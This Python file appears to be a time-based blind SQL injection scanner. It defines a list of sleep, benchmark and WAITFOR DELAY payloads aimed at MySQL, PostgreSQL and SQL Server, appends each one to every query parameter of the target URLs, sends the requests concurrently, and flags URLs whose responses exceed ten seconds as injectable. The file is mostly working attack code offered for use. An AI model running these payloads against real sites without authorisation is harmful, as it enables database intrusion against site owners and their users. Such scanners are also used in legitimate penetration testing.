import time

from furl import furl
import aiohttp, asyncio, async_timeout


#https://stackoverflow.com/questions/57126286/fastest-parallel-requests-in-python

first_time_second = 10
# first_time_second_payload = 12
# second_time_second = 20



_payloads="""
'+(select*from(select(sleep(12)))a)+'
1'||pg_sleep(12)
+or+sleep(12)
-sleep(12)
IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(12))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(12)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(12)))OR"*/
-sleep/*f*/(12)
1'WAITFOR+DELAY+'0:0:12'
+or+WAITFOR+DELAY+'0:0:12'
""".split('\n')

def generateOneTestUrl(url:str,payload:str)->str:
    #https://github.com/gruns/furl
    f =furl(url)
    for pname, pvalue in f.args.items():
        f.args[pname] =  pvalue+payload
    return f.url

def generateTestUrls(urls:set,payloads:list)->set:
    test_urls= set([generateOneTestUrl(url,payload) for url in urls for payload in payloads])
    return test_urls



async def testUrl(session, url,timeout=60):
    start = time.time()
    res = ""
    # SECTION-UNDER-TEST
    with async_timeout.timeout(timeout):  # TIMEOUT-PROTECTED
        async with session.get(url) as response:
            while True:
                chunk = await response.content.read(1024)
                if not chunk:
                    break
                res += str(chunk)
            await response.release()
    end = time.time()
    runtime = end - start

    return url,runtime


async def testUrlWrapper(async_loop, test_urls):
    async with aiohttp.ClientSession(loop=async_loop) as session:
        corou_to_execute = [testUrl(session, url) for url in test_urls]
        results = await asyncio.gather(*corou_to_execute)   #results [('a', 'b'), ('a', 'b'), ('a', 'b')]
        return results

def processResult(results:list):
    url_seconds = {}
    for entry in results:
        if entry[1] > first_time_second :
            url_seconds[entry[0]] = entry[1]
    return url_seconds

def main(urls:set):
    test_urls = generateTestUrls(urls,_payloads)

    event_loop = asyncio.get_event_loop()
    results = event_loop.run_until_complete(testUrlWrapper(event_loop, test_urls))
    url_seconds = processResult(results)
    if url_seconds:
        return url_seconds


if __name__ == '__main__':
    pass